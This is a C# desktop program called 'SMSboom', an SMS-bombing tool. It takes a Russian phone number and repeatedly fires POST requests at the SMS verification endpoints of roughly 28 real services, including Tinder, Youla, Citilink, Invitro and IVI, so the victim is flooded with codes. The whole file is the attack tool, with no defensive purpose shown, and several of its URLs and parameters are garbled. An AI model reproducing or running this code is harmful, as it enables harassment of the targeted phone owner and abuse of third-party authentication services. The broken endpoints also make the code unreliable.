using System;
using System.IO;
using System.Net;
using System.Text;
using System.Windows;
using System.Windows.Input;

namespace SMSboom
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            for (int i = 1; i < 20; i++)
            {
                cb1.Items.Add(i);
            }
            tb1.MaxLength = 10;
        }


        private static string Post(string Url, string Data)
        {
            WebRequest req = WebRequest.Create(Url);
            req.Method = "POST";
            req.Timeout = 10000;
            req.ContentType = "application/x-www-form-urlencoded";
            byte[] sentData = Encoding.GetEncoding(1251).GetBytes(Data);
            req.ContentLength = sentData.Length;
            Stream sendStream = req.GetRequestStream();
            sendStream.Write(sentData, 0, sentData.Length);
            sendStream.Close();
            WebResponse res = req.GetResponse();
            Stream ReceiveStream = res.GetResponseStream();
            StreamReader sr = new StreamReader(ReceiveStream, Encoding.UTF8);
            Char[] read = new Char[256];
            int count = sr.Read(read, 0, 256);
            string Out = String.Empty;
            while (count > 0)
            {
                String str = new String(read, 0, count);
                Out += str;
                count = sr.Read(read, 0, 256);
            }
            return Out;

        }

        public void Send(string adress, string mask, string name)
        {
            try
            {
                string Answer = Post(adress, mask);
                tb2.AppendText($"С помощью сервиса {name} отправлено\n");
            }
            catch
            {
                tb2.AppendText($"Не-а, {name}  не смог\n");
            }
        }

        private void b1_Click(object sender, RoutedEventArgs e)
        {
            String number = tb1.Text;
            for (int i = 0; i < int.Parse(cb1.Text); i++)
            {
                Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number =+7{number}", "Tinder");
                Send("https://app.karusel.ru/api/v1/phone/", $"phone_number=+7{number}", "karusel");
                Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone_number=+7{number}", "qlean");
                Send("https://api-prime.anytime.global/api/v2/auth/sendverificationcode", $"phone_number=+7{number}", "api-prime");
                Send("https://youla.ru/web-api/auth/request_code", $"phone_number +7{number}", "youla");
                Send("https://www.citilink.ru/registration/confirm/phone/+", $"phone_number=+7{number}", "citilink");
                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone_number=+7{number}", "sunlight");
                Send("https://lk.invitro.ru/sp/mobileapi/createuserbypassword", $"phone_number=+7{number}", "invitro");
                Send("https://api.delitime.ru/api/v2/signup", $"phone_number=+7{number}", "delitime");
                Send("https://api.mtstv.ru/v1/users", $"phone_number +7{number}", "mtstv");
                Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"phone_number=+7{number}", "rutaxi");
                Send("https://www.icq.com/smsreg/requestphonevalidation.php", $"phone_number=+7{number}", "icq");
                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"phone_number=+7{number}", "terra-1");
                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone_number=+7{number}", "ivi");
                Send("https://api_gotinder.com/v2/auth/sms/send?auth typessms&locale=ru", $"phone_number=+7{number}", "gitinder");
                Send("https://app.karusel.ru/api/v1/phone", $"phone=8{number}", "Карусель");
                Send("https://glean.ru/clients-api/v2/smscodes/auth/request_code", $"phone=7{number}", "Qlean");
                Send("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7 {number}", "AT PRIME");
                Send("https://youla.ru/web-api/auth/request_code", $"phone=+7{number}", "Юла");
                Send($"https://unw.citilink.ru/registration/confirm/phone/+ 7{number}/", $"", "CityLink");
                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone=7{number}", "SunLight");
                Send("https://1k.invitro.ru/sp/mobileApi/createUserByPassword", $"password=ctclutctc&application=1kp&login= +7{number}", "Invitro");
                Send("https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{number}&SignupForm[device_type]=3", "DeliMobil");
                Send("https://api.mtstv.ru/v1/users", $"msisdn=7{number}", "МТС");
                Send("https://moscow.rutaxi.ru/ajax keycode. html", $"l={number}", "Rutaxi");
                Send("https://www.icq.com/smsreg/reguestPhoneValidation.php icq.com/smsreg/requestPhoneValidation. php", $"msisdn=7{number}&locale=en&countryCode=ru&version=1&k" +
                $"[-ic1rtwz1s1Hj100r&r=46763", "ICQ");
                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"node=request&phone=+7{number}&phone_permission=unknown&stream" +
                $"_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver");
                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{number}", "IVI");
            }
        }

        private void tb1_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            e.Handled = "0123456789".IndexOf(e.Text) < 0;
        }
    }
}
